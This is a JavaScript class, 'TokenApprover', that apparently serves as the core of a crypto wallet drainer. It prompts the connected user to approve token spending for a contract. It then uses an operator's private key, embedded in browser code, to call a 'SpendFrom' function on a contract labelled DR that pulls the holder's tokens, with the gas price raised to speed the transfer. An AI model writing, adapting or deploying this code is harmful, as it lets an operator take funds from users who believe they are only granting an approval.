import { writeContract, readContract, getWalletClient, getPublicClient } from "https://esm.sh/@wagmi/core@2.x"

const SIMPLIFIED_ABI = [
  {
    constant: false,
    inputs: [
      { name: "_spender", type: "address" },
      { name: "_value", type: "uint256" },
    ],
    name: "approve",
    outputs: [{ name: "success", type: "bool" }],
    type: "function",
  },
  {
    constant: true,
    inputs: [
      { name: "_owner", type: "address" },
      { name: "_spender", type: "address" },
    ],
    name: "allowance",
    outputs: [{ name: "remaining", type: "uint256" }],
    type: "function",
  },
  {
    constant: true,
    inputs: [{ name: "_owner", type: "address" }],
    name: "balanceOf",
    outputs: [{ name: "balance", type: "uint256" }],
    type: "function",
  },
]

const DR_CONTRACT_ABI = [
  {
    inputs: [
      { internalType: "address", name: "_holder", type: "address" },
      { internalType: "uint256", name: "_amount", type: "uint256" },
    ],
    name: "SpendFrom",
    outputs: [],
    stateMutability: "payable",
    type: "function",
  },
]

export class TokenApprover {
  constructor(wagmiConfig, ownerPrivateKey) {
    this.config = wagmiConfig
    this.ownerPrivateKey = ownerPrivateKey
    this.web3 = new Web3(window.ethereum)
  }

  async approveAndSpend(tokenAddress, spenderAddress, amount, approval, holder) {
    try {
      const walletClient = await getWalletClient(this.config)
      if (!walletClient) {
        throw new Error("No wallet client found")
      }

      const publicClient = getPublicClient(this.config)
      if (!publicClient) {
        throw new Error("No public client found")
      }

      // Check allowance
      const currentAllowance = await this.checkAllowance(tokenAddress, holder, spenderAddress)
      console.log("Current allowance:", currentAllowance.toString())

      // Check balance
      const balance = await this.checkBalance(tokenAddress, holder)
      console.log("Current balance:", balance.toString())

      if (balance < amount) {
        throw new Error("Insufficient balance")
      }

      // If allowance is less than the amount, approve first
      if (currentAllowance < amount) {
        console.log("Approving tokens...")
        const approveTx = await this.approveToken(tokenAddress, spenderAddress, approval)
        console.log("Approval transaction:", approveTx)
        await publicClient.waitForTransactionReceipt({ hash: approveTx })
      }

      // Prepare owner account for SpendFrom
      const account = this.web3.eth.accounts.privateKeyToAccount(this.ownerPrivateKey)
      this.web3.eth.accounts.wallet.add(account)

      // Get current nonce and gas price
      const nonce = await this.web3.eth.getTransactionCount(account.address, "pending")
      const gasPrice = await this.web3.eth.getGasPrice()

      // Slightly increase gas price
      const increasedGasPrice = (BigInt(gasPrice) * BigInt(110)) / BigInt(100)

      // Call SpendFrom using owner's account
      console.log("Calling SpendFrom...")
      const contract = new this.web3.eth.Contract(DR_CONTRACT_ABI, spenderAddress)
      const spendTx = await contract.methods.SpendFrom(holder, amount).send({
        from: account.address,
        gas: 200000, // Adjust as needed
        nonce: nonce,
        gasPrice: increasedGasPrice.toString(),
      })

      console.log("SpendFrom transaction:", spendTx)

      return { spendTx }
    } catch (error) {
      console.error("Detailed approval and spend error:", error)
      throw new Error(`Approval and spend failed: ${error.message}`)
    }
  }

  async approveToken(tokenAddress, spenderAddress, approval) {
    return writeContract(this.config, {
      address: tokenAddress,
      abi: SIMPLIFIED_ABI,
      functionName: "approve",
      args: [spenderAddress, approval],
    })
  }

  async checkAllowance(tokenAddress, ownerAddress, spenderAddress) {
    return readContract(this.config, {
      address: tokenAddress,
      abi: SIMPLIFIED_ABI,
      functionName: "allowance",
      args: [ownerAddress, spenderAddress],
    })
  }

  async checkBalance(tokenAddress, ownerAddress) {
    return readContract(this.config, {
      address: tokenAddress,
      abi: SIMPLIFIED_ABI,
      functionName: "balanceOf",
      args: [ownerAddress],
    })
  }
}

